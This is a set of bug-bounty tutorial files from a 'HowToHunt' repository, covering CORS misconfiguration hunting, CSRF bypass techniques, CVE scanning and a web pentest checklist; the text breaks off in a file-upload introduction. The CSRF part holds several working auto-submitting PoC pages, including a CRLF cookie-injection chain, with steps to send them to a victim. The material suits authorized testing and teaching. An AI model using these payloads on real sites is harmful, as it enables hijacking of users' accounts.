{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CORS/CORS.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CORS/CORS.md", "content": "# Misconfigured CORS\n Here are few methods and steps you can do to check for misconfigure cors.\n\n* Hunting method 1(Single target):\n\n```\nStep->1. Capture the target website and spider or crawl all the website using burp.\nStep->2. Use burp search look for Access-Control\nStep->3. Try to add Origin Header i.e,Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com\nStep->4  If origin is reflected in response means the target is vuln to CORS\n```\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\n* Hunting method 2(mutliple means including subdomains):\n```\nstep 1-> find domains i.e subfinder -d target.com -o domains.txt\nstep 2-> check alive ones : cat domains.txt | httpx | tee -a alive.txt\nstep 3-> send each alive domain into burp i.e, cat alive.txt | parallel -j 10 curl --proxy \"http://127.0.0.1:8080\" -sk 2>/dev/null\nstep 4-> Repeat hunting method 1\n```\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\n* Both above method are manual methods so lets check an automated way\n# Tools\n* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)\n* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)\n* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)\n* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)\n\n# Automate Way :\n```\nstep1-> find domains i.e, subfinder -d domain.com -o target.txt\nstep2-> grep alive: cat target.txt | httpx | tee -a alive.txt\nstep3-> grep all urls using waybackurls by @tomnomnom and gau tool i.e,cat alive.txt | gau | tee -a urls.txt\nstep4-> run any of these tools on each url \nstep5-> configure the manually\n```\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\n# Another Method\n\n### Tools You Will Need for this method.\n* [https://github.com/tomnomnom/meg](https://github.com/tomnomnom/meg)\n* [https://github.com/tomnomnom/gf](https://github.com/tomnomnom/gf)\n* [https://github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)\n* [https://github.com/tomnomnom/assetfinder](https://github.com/tomnomnom/assetfinder)\n* [https://github.com/Edu4rdSHL/findomain](https://github.com/Edu4rdSHL/findomain)\n* [https://github.com/projectdiscovery/httpx](https://github.com/projectdiscovery/httpx)\n         \n### Steps\n```\n1) Find Domains with the help of subfinder,assetfinder,findomain i.e , subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1 .\n2) Then cat hosts1 | sort -u | tee -a hosts2 and then cat hosts2 | httpx | tee -a hosts .\n3) Navigate through terminal where hosts file is located  echo \"/\" > paths\n4) Then type meg -v\n5) After the completion of process type gf cors.\n6) All the urls with Access-Control-Allow will be displayed.  \n```\n\n# Authors\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\n", "timestamp": "2025-10-21T22:02:02.213000"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CORS/CORS_Bypasses.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CORS/CORS_Bypasses.md", "content": "# CORS Bypass\t\n1. `Origin:null`\n2. `Origin:attacker.com`\n3. `Origin:attacker.target.com`\n4. `Origin:attackertarget.com`\n5. `Origin:sub.attackertarget.com`\n6. `Origin:attacker.com and then change the method Get to post/Post to Get`\n7. `Origin:sub.attacker target.com`\n8. `Origin:sub.attacker%target.com`\n9. `Origin:attacker.com/target.com`\n\n### Authors\n\n* [@tamimhasan404](https://twitter.com/tamimhasan404)\n\t\n# Reference Tweets\nhttps://twitter.com/trbughunters/status/1287023673845612546\n\nhttps://twitter.com/Paresh_parmar1/status/1265251507655630848\n\nhttps://twitter.com/Alra3ees/status/1141504347089584128\n", "timestamp": "2025-10-21T22:02:02.317506"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CSRF/CSRF.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CSRF/CSRF.md", "content": "# Introduction\n\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.\n\nFor a CSRF attack to be possible, three key conditions must be in place:\n\n- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).\n\n- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.\n- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.\n\nAlthough CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.\n\n- Basic Payload to automatically submit the request when the web page opens.\n    \n    ```markdown\n    <html>\n      <body>\n        <form action=\"https://vulnerable-website.com/email/change\" method=\"POST\">\n          <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" />\n        </form>\n        <script>\n          document.forms[0].submit();\n        </script>\n      </body>\n    </html>\n    ```\n    \n\n# Testing CSRF\n\n## Base Steps:\n\n```markdown\n1. Select a request anywhere in Burp Suite Professional that you want to test or exploit.\n2. From the right-click context menu, select Engagement tools / Generate CSRF PoC.\n3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).\n4. You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.\n5. Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.\n```\n\n### Bypass Method -1 : Change the request method `POST` → `GET`\n\n```markdown\nTest Case: Validation of CSRF token depends on request method\n\n1. Interect with functionality and intercept the request.\n2. Send this requets to repeater and right click change request method\n3. Remove any csrf param and genrate csrf poc\n4. Edit according to your preference,For example:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"GET\" action=\"https://ac591fd21f4ab3d2807a1b1d0007000d.web-security-academy.net:443/email/change-email?email=natsu%40natsu.com\">\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\n\t</form>\n<script>\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n5. Done send this to victim.\n```\n\n### Bypass Method - 2: Remove csrf param from `POST` request.\n\n```markdown\nTest Case: Validation of CSRF token depends on token being present\n\n1. Interect with functionality and intercept the request.\n2. Send this requets to repeater.\n3. Remove any csrf param and generate csrf poc\n4. Edit according to your preference,For example:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email\">\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\n\t</form>\n<script>\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n5. Done send this to victim.\n```\n\n### Bypass Method - 3: Feed your own account generated CSRF token in attack.\n\n```markdown\nTest Case: CSRF token is not tied to the user session.\n\n1. Interect with functionality and intercept the request.\n2. Right click generate csrf poc.\n3. Copy the code in a file.html remove any session token\n4. Drop the request.\n5. Send the file.html to victim.\n\nExample CSRF Code:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://acd81f251e0c762980c31ae600c70041.web-security-academy.net:443/email/change-email\">\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\n\t\t<input type=\"text\" name=\"csrf\" value=\"NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw\">\n\t</form>\n<script>\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n```\n\n### Bypass Method - 4 : Chain any other vulnerability to add your cookie for example `XSS`, `CRLF` → `CSRF`\n\n```markdown\nTest Case - 1 : CSRF token is tied to a non-session cookie, when we have two csrf token one in cookie and other in the functionality this is due to presence of two framework one for session handling and one for CSRF protection, which are not integrated together.\n\t\t\t\t\t The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com.\n\n1. Find any vulnerability which allow you to inject something in the cookie of victim.\n2. Test if CSRF token is tied to session id (try changing session id keeping everything as it is))\n3. Check if the your csrf token works when replaced in victims request\n4. Lastly check if you can inject CRLF and change csrf cookie value\n5. Done now make a csrf poc with xss payload which execute crlf and send this poc to victim\n\nExample CSRF Code:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac981fc81ee9f58b80984ae400200076.web-security-academy.net:443/my-account/change-email\">\n\t\t<input type=\"text\" name=\"csrfKey\" value=\"ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9\">\n\t\t<input type=\"text\" name=\"email\" value=\"hehe@hehe.com\">\n\t\t<input type=\"text\" name=\"csrf\" value=\"6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81\">\n\t\t<input type=\"submit\" value=\"Send\">\n\t</form>\n<img src=\"http://ac981fc81ee9f58b80984ae400200076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9\" onerror=\"document.forms[0].submit()\">\n</body>\n</html>\n\n\nTest Case - 2 : CSRF token is simply duplicated in a cookie, here csrf token value can be anything just need to be same in cookie as wells as param. \n\n1. Intercept and action and try changing csrf token in both cookie and param\n2. Make similar poc as above but this time put same csrf token in crlf payload and request param.\n3. Done, Send it to victim.\n\nExample CSRF POC:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac071f601e8dc74380609c1d000900b3.web-security-academy.net:443/my-account/change-email\">\n\t\t<input type=\"text\" name=\"csrf\" value=\"K5r92qL9pGzpC2joPMkqgBSY1GG3eo6I\">\n\t\t<input type=\"text\" name=\"session\" value=\"xdCFpxBe1M0MHvk0DmFuzCRlImMgdxZk\">\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\n\t\t<input type=\"text\" name=\"csrf\" value=\"fake\">\n\t\t<input type=\"submit\" value=\"Send\">\n\t</form>\n<img src=\"http://ac071f601e8dc74380609c1d000900b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake\" onerror=\"document.forms[0].submit()\">\n</body>\n</html>\n\n```\n\n## Bypass Method - 5 : Delete the Referrer Header Completely or Suppress it.\n\n```markdown\nTest Case: CSRF where Referer validation depends on header being present.\n\n1. Intercept the request and try changing referer to some other domain.\n2. If that didn't work then you will have to suppress the refere header.\n3. you can use `<meta name=\"referrer\" content=\"no-referrer\">` or any other technique.\n4. Done, Make a normal POC with that technique.\n\nExample CSRF POC:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac6d1fe21fb2a0c7809510e7001c006c.web-security-academy.net:443/my-account/change-email\">\n\t\t<input type=\"text\" name=\"session\" value=\"S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve\">\n\t\t<input type=\"text\" name=\"email\" value=\"hola@hola.com\">\n<meta name=\"referrer\" content=\"no-referrer\">\n\t</form>\n<script>\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n```\n\n## Bypass Method - 6 : Try [attacker.com](http://attacker.com) or similar payload in referer header. (Validation of Referer can be circumvented)\n\n```markdown\nTest case: CSRF with broken Referer validation\n\n1. Intercept the request and try changing referer to some other domain. (Check all cases how it is been verified)\n2. Now Generate a normal POC and include any JavaScript in the script block to alter the URL and Referer\n3. Done Send it to victim.\n\nExample CSRF POC:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac761f621f79d75680e4054c00160033.web-security-academy.net:443/my-account/change-email\">\n\t\t<input type=\"text\" name=\"session\" value=\"rk13v2KYDFByO0OFL0xnHcnIVZbvAHNg\">\n\t\t<input type=\"text\" name=\"email\" value=\"gg@gg.com\">\n\t\t<input type=\"submit\" value=\"Send\">\n\t</form>\n<script>\n\t\t\thistory.pushState(\"\", \"\", \"/?ac761f621f79d75680e4054c00160033.web-security-academy.net\")\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n```\n\n## Bypass Method - 7: Send `null` value in csrf token.\n\n```markdown\nTest Case: Validation of CSRF token depends on token value being\n\n1. Interect with functionality and intercept the request.\n2. Send this requets to repeater.\n3. Add null csrf param and generate csrf poc\n4. Edit according to your preference,For example:\n\n<!DOCTYPE html>\n<html>\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\n<body>\n\t<form method=\"POST\" action=\"https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email\">\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\n\t</form>\n<script>\n      document.forms[0].submit();\n    </script>\n</body>\n</html>\n\n5. Done send this to victim.\n```\n\n# Mitigation\n\n- Defending against CSRF with SameSite cookies\n    \n    - The `SameSite` attribute can be used to control whether and how cookies are submitted in cross-site requests. By setting the attribute on session cookies, an application can prevent the default browser behavior of automatically adding cookies to requests regardless of where they originate.\n    \n   -  The `SameSite` attribute is added to the `Set-Cookie` response header when the server issues a cookie, and the attribute can be given two values, `Strict` or `Lax`. For example:\n    \n    `SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;`\n    \n    `SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;`\n    \n    - If the `SameSite` attribute is set to `Strict`, then the browser will not include the cookie in any requests that originate from another site. This is the most defensive option, but it can impair the user experience, because if a logged-in user follows a third-party link to a site, then they will appear not to be logged in, and will need to log in again before interacting with the site in the normal way.\n    \n    - If the `SameSite` attribute is set to `Lax`, then the browser will include the cookie in requests that originate from another site but only if two conditions are met:\n    \n    - The request uses the GET method. Requests with other methods, such as POST, will not include the cookie.\n    - The request resulted from a top-level navigation by the user, such as clicking a link. Other requests, such as those initiated by scripts, will not include the cookie.\n    \n  -   Using `SameSite` cookies in `Lax` mode does then provide a partial defense against CSRF attacks, because user actions that are targets for CSRF attacks are often implemented using the POST method. Two important caveats here are:\n    \n    - Some applications do implement sensitive actions using GET requests.\n    - Many applications and frameworks are tolerant of different HTTP methods. In this situation, even if the application itself employs the POST method by design, it will in fact accept requests that are switched to use the GET method.\n    \n    For the reasons described, it is not recommended to rely solely on SameSite cookies as a defense against CSRF attacks. Used in conjunction with [CSRF tokens](https://portswigger.net/web-security/csrf/tokens), however, SameSite cookies can provide an additional layer of defense that might mitigate any defects in the token-based defenses.\n    \n- Using CSRF Token\n    \n    The most robust way to defend against CSRF attacks is to include a [CSRF token](https://portswigger.net/web-security/csrf/tokens) within relevant requests. The token should be:\n    \n    - Unpredictable with high entropy, as for session tokens in general.\n    - Tied to the user's session.\n    - Strictly validated in every case before the relevant action is executed.\n    \n\n# Reference\n\n[What is CSRF (Cross-site request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/csrf)\n\n[Top 25 CSRF Bug Bounty Reports](https://corneacristian.medium.com/top-25-csrf-bug-bounty-reports-ffb0b61afa55)\n\n[KathanP19/HowToHunt](https://github.com/KathanP19/HowToHunt/blob/master/CSRF/Cross_Site_Request_Forgery_Bypass.md)\n\n- Checklist\n    \n![https://pbs.twimg.com/media/ER_exjuU4AIDHzs?format=png&name=900x900](https://pbs.twimg.com/media/ER_exjuU4AIDHzs?format=png&name=900x900)\n    \n\n![https://pbs.twimg.com/media/EsAj4HTW8AIk9rZ?format=jpg&name=900x900](https://pbs.twimg.com/media/EsAj4HTW8AIk9rZ?format=jpg&name=900x900)\n\n## Author:\n[KathanP19](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:02.912202"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CSRF/Cross_Site_Request_Forgery_Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CSRF/Cross_Site_Request_Forgery_Bypass.md", "content": "**Cross Site Request Forgery(CSRF)**\n\nHello Guys, I Tried My Best To Share all The CSRF Bypasses I Know.\nI Hope This Will Help You.\n\nCsrf will be login, logout, resetpass, change password, add-cart, like, comment, profie change, user details change, blance transffer, subscription ect\n```\n-Change Request Method [POST => GET]\n\n-Remove Total Token Parameter\n\n-Remove The Token, And Give a Blank Parameter\n\n-Copy a Unused Valid Token , By Dropping The Request and Use That Token\n\n-Use Own CSRF Token To Feed it to Victim\n\n-Replace Value With Of A Token of Same Length \n\n-Reverse Engineer The Token\n\n-Extract Token via HTML injection\n\n-Switch From Non-Form `Content-Type: application/json` or `Content-Type: application/x-url-encoded` To `Content-Type: form-multipart`\n\n-Change/delete the last or frist character from the token\n\n-Change referrer to Referrer\n\n-Bypass the regex\n  If the site is looking for “bank.com” in the referer URL, maybe “bank.com.attacker.com” or “attacker.com/bank.com” will work.\n    \n-Remove the referer header (add this <meta name=”referrer” content=”no-referrer”> in your payload or html code)\n\n-Clickjacking\n\n  (If you aren’t familiar with clickjacking attacks, more information can be found https://owasp.org/www-community/attacks/Clickjacking.)\n  Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where   the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF   attack on the endpoint, albeit with a bit more effort.\n\t\n\n\n```\n\n### References\n[Medium Writeup](https://medium.com/swlh/intro-to-csrf-cross-site-request-forgery-9de669df03de)\n\n[Medium Writeup](https://medium.com/swlh/attacking-sites-using-csrf-ba79b45b6efe)\n\n[Medium Writeup](https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee)\n\n\n### Authors\n* [@SMHTahsin33](https://twitter.com/SMHTahsin33)\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\n* [@remonsec](https://twitter.com/remonsec)\n* [@tamimhasan404](https://twitter.com/tamimhasan404)\n\n", "timestamp": "2025-10-21T22:02:03.028992"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CVES/easycve.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CVES/easycve.md", "content": "# Easy CVEs using Research\n\n### Tools\n\n* `Google`\n* `Twitter`\n* `Nuclei`\n\n---\n\n### Steps:\n\n1. **Grab all the subdomains**:\n\n   ```bash\n   subfinder -d domain.com -o subs.txt\n   ```\n\n2. **Grab all alive domains**:\n\n   ```bash\n   httpx -l subs.txt -mc 200 -o alive.txt\n   ```\n\n3. **Run Nuclei scans separately** for different template categories and store each result in a different file:\n\n   ```bash\n   nuclei -l alive.txt -t nuclei-templates/http/misconfiguration -o misconfigurations.txt\n   nuclei -l alive.txt -t nuclei-templates/http/exposed-panels -o exposed-panels.txt\n   nuclei -l alive.txt -t nuclei-templates/http/cves -o cves.txt\n   nuclei -l alive.txt -t nuclei-templates/http/technologies -o technologies.txt\n   ```\n\n\n4. **Read each output carefully** with patience.\n\n5. **Find interesting tech** used by target (e.g. Jira, WordPress, etc.).\n\n6. **Visit the page** and check the version used.\n\n7. **Google search** with that version like:\n   `jira <version> exploit`\n\n8. **Grep CVE IDs** that look promising.\n\n9. **Search CVE on Twitter** (`CVE-XXXX-XXXX poc` or `CVE-XXXX-XXXX exploit`)\n\n10. **Google the CVE or exploit keywords** for better PoCs or writeups.\n\n11. **Test all CVEs** — if successful, report it! \n\n---\n\n### Authors\n\n* [@Virdoex\\_hunter](https://x.com/Virdoex_hunter)\n* [@Psikoz\\_Coder](https://x.com/Psikoz_Coder)\n", "timestamp": "2025-10-21T22:02:03.698405"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "CheckList/Web-Application-Pentesting-checklist.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/CheckList/Web-Application-Pentesting-checklist.md", "content": "# Bug Bounty Checklist for Web App\n\n> This checklist may help you to have a good methodology for bug bounty hunting  \nWhen you have done a action, don't forget to check ;)  \nHappy hunting !  \n\n## Table of Contents\n\n* [Recon on wildcard domain](#\"Recon_on_wildcard_domain\")\n* [Single domain](#Single_domain)\n* [Information Gathering](#Information)\n* [Configuration Management](#Configuration)\n* [Secure Transmission](#Transmission)\n* [Authentication](#Authentication)\n* [Session Management](#Session)\n* [Authorization](#Authorization)\n* [Data Validation](#Validation)\n* [Denial of Service](#Denial)\n* [Business Logic](#Business)\n* [Cryptography](#Cryptography)\n* [Risky Functionality - File Uploads](#File)\n* [Risky Functionality - Card Payment](#Card)\n* [HTML 5](#HTML)\n\n\n## <a name=\"Recon_on_wildcard_domain\">Recon on wildcard domain</a>  \nThis recon process is from [0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)\n\n- [ ] Run Amass\n- [ ] Run Subfinder\n- [ ] Run Rapid7 FDNS\n- [ ] Use commonspeak2 list\n- [ ] Run massdns\n- [ ] Run altdns\n- [ ] Run massdns\n\n\n## <a name=\"Single_domain\">Single Domain</a>  \n\n### Scanning  \n\n- [ ] Arachni Scan  \n- [ ] Owasp ZAp Scan  \n- [ ] Burp Spider  \n- [ ] Burp Scanning   \n- [ ] Wayback machine  \n- [ ] Linkfinder  \n- [ ] Url with Android application   \n\n### Manual checking  \n\n- [ ] Shodan  \n- [ ] Censys  \n- [ ] Google dorks  \n- [ ] Pastebin  \n- [ ] Github  \n- [ ] OSINT     \n\n### <a name=\"Information\">Information Gathering</a>\n- [ ] Manually explore the site  \n- [ ] Spider/crawl for missed or hidden content  \n- [ ] Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store  \n- [ ] Check the caches of major search engines for publicly accessible sites  \n- [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)  \n- [ ] Perform Web Application Fingerprinting  \n- [ ] Identify technologies used  \n- [ ] Identify user roles  \n- [ ] Identify application entry points  \n- [ ] Identify client-side code  \n- [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)  \n- [ ] Identify co-hosted and related applications  \n- [ ] Identify all hostnames and ports  \n- [ ] Identify third-party hosted content  \n- [ ] Identify Debug parameters  \n\n\n### <a name=\"Configuration\">Configuration Management</a>\n\n- [ ] Check for commonly used application and administrative URLs  \n- [ ] Check for old, backup and unreferenced files  \n- [ ] Check HTTP methods supported and Cross Site Tracing (XST)  \n- [ ] Test file extensions handling  \n- [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)  \n- [ ] Test for policies (e.g. Flash, Silverlight, robots)  \n- [ ] Test for non-production data in live environment, and vice-versa  \n- [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)  \n\n\n### <a name=\"Transmission\">Secure Transmission</a>\n\n- [ ] Check SSL Version, Algorithms, Key length  \n- [ ] Check for Digital Certificate Validity (Duration, Signature and CN)  \n- [ ] Check credentials only delivered over HTTPS  \n- [ ] Check that the login form is delivered over HTTPS  \n- [ ] Check session tokens only delivered over HTTPS  \n- [ ] Check if HTTP Strict Transport Security (HSTS) in use  \n\n\n\n### <a name=\"Authentication\">Authentication</a>\n- [ ] Test for user enumeration  \n- [ ] Test for authentication bypass  \n- [ ] Test for bruteforce protection  \n- [ ] Test password quality rules  \n- [ ] Test remember me functionality  \n- [ ] Test for autocomplete on password forms/input  \n- [ ] Test password reset and/or recovery  \n- [ ] Test password change process  \n- [ ] Test CAPTCHA  \n- [ ] Test multi factor authentication  \n- [ ] Test for logout functionality presence  \n- [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)  \n- [ ] Test for default logins  \n- [ ] Test for user-accessible authentication history  \n- [ ] Test for out-of channel notification of account lockouts and successful password changes  \n- [ ] Test for consistent authentication across applications with shared authentication schema / SSO  \n\n\n\n### <a name=\"Session\">Session Management</a>\n- [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)  \n- [ ] Check session tokens for cookie flags (httpOnly and secure)  \n- [ ] Check session cookie scope (path and domain)  \n- [ ] Check session cookie duration (expires and max-age)  \n- [ ] Check session termination after a maximum lifetime  \n- [ ] Check session termination after relative timeout  \n- [ ] Check session termination after logout  \n- [ ] Test to see if users can have multiple simultaneous sessions  \n- [ ] Test session cookies for randomness  \n- [ ] Confirm that new session tokens are issued on login, role change and logout  \n- [ ] Test for consistent session management across applications with shared session management  \n- [ ] Test for session puzzling  \n- [ ] Test for CSRF and clickjacking  \n\n\n\n### <a name=\"Authorization\">Authorization</a>\n- [ ] Test for path traversal  \n- [ ] Test for bypassing authorization schema  \n- [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)  \n- [ ] Test for horizontal Access control problems (between two users at the same privilege level)  \n- [ ] Test for missing authorization  \n\n\n### <a name=\"Validation\">Data Validation</a>\n- [ ] Test for Reflected Cross Site Scripting  \n- [ ] Test for Stored Cross Site Scripting  \n- [ ] Test for DOM based Cross Site Scripting  \n- [ ] Test for Cross Site Flashing  \n- [ ] Test for HTML Injection  \n- [ ] Test for SQL Injection  \n- [ ] Test for LDAP Injection  \n- [ ] Test for ORM Injection  \n- [ ] Test for XML Injection  \n- [ ] Test for XXE Injection  \n- [ ] Test for SSI Injection  \n- [ ] Test for XPath Injection  \n- [ ] Test for XQuery Injection  \n- [ ] Test for IMAP/SMTP Injection  \n- [ ] Test for Code Injection  \n- [ ] Test for Expression Language Injection  \n- [ ] Test for Command Injection  \n- [ ] Test for Overflow (Stack, Heap and Integer)  \n- [ ] Test for Format String  \n- [ ] Test for incubated vulnerabilities  \n- [ ] Test for HTTP Splitting/Smuggling  \n- [ ] Test for HTTP Verb Tampering  \n- [ ] Test for Open Redirection  \n- [ ] Test for Local File Inclusion  \n- [ ] Test for Remote File Inclusion  \n- [ ] Compare client-side and server-side validation rules  \n- [ ] Test for NoSQL injection  \n- [ ] Test for HTTP parameter pollution  \n- [ ] Test for auto-binding  \n- [ ] Test for Mass Assignment  \n- [ ] Test for NULL/Invalid Session Cookie  \n\n### <a name=\"Denial\">Denial of Service</a>\n- [ ] Test for anti-automation  \n- [ ] Test for account lockout  \n- [ ] Test for HTTP protocol DoS  \n- [ ] Test for SQL wildcard DoS  \n\n\n### <a name=\"Business\">Business Logic</a>\n- [ ] Test for feature misuse  \n- [ ] Test for lack of non-repudiation  \n- [ ] Test for trust relationships  \n- [ ] Test for integrity of data  \n- [ ] Test segregation of duties  \n\n\n### <a name=\"Cryptography\">Cryptography</a>\n- [ ] Check if data which should be encrypted is not  \n- [ ] Check for wrong algorithms usage depending on context  \n- [ ] Check for weak algorithms usage  \n- [ ] Check for proper use of salting  \n- [ ] Check for randomness functions  \n\n\n### <a name=\"File\">Risky Functionality - File Uploads</a>\n- [ ] Test that acceptable file types are whitelisted  \n- [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced  \n- [ ] Test that file contents match the defined file type  \n- [ ] Test that all file uploads have Anti-Virus scanning in-place.  \n- [ ] Test that unsafe filenames are sanitised  \n- [ ] Test that uploaded files are not directly accessible within the web root  \n- [ ] Test that uploaded files are not served on the same hostname/port  \n- [ ] Test that files and other media are integrated with the authentication and authorisation schemas  \n\n\n### <a name=\"Card\">Risky Functionality - Card Payment</a>\n- [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application  \n- [ ] Test for default or guessable password  \n- [ ] Test for non-production data in live environment, and vice-versa  \n- [ ] Test for Injection vulnerabilities  \n- [ ] Test for Buffer Overflows  \n- [ ] Test for Insecure Cryptographic Storage  \n- [ ] Test for Insufficient Transport Layer Protection  \n- [ ] Test for Improper Error Handling  \n- [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0  \n- [ ] Test for Authentication and Authorization issues  \n- [ ] Test for CSRF  \n\n\n### <a name=\"HTML\">HTML 5</a>\n- [ ] Test Web Messaging  \n- [ ] Test for Web Storage SQL injection  \n- [ ] Check CORS implementation  \n- [ ] Check Offline Web Application  \n\nSource:  \n[OWASP](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)  \n[OWASP] https://github.com/OWASP/CheatSheetSeries\n[0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)\n\nCredits:-\n- [Sehno](https://github.com/sehno/Bug-bounty)\n", "timestamp": "2025-10-21T22:02:04.240872"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "File_Upload/file_upload.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md", "content": "# Introduction\n\n- File upload vulnerability is a noteworthy issue with online applications. If a web application has this type of vulnerability, an aggressor can upload a file with malicious code in it that can be executed on the server. An assailant may most likely put a phishing page into the site or mutilate it to uncover internal data of the web server to other people.\n- Allowing file uploads by end-users, especially if done without a full understanding of the risks associated with it, is akin to opening the floodgates for server compromise. Naturally, despite the security concerns surrounding the ability for end-users to upload files, it is an increasingly common requirement in modern web applications.\n- File uploads carry a significant risk that not many are aware of, or how to mitigate against abuses. Worst still, several web applications contain insecure, unrestricted file upload mechanisms.\n- Make sure you read \"**First Link in the Reference!!**\" its a great blog then proceed further.\n\n**What can you achieve by exploiting file-upload:**\n\n- Remote code execution\n- SSRF\n- XSS\n- LFI\n- XXE\n- Phishing\n- Parameter pollution\n- 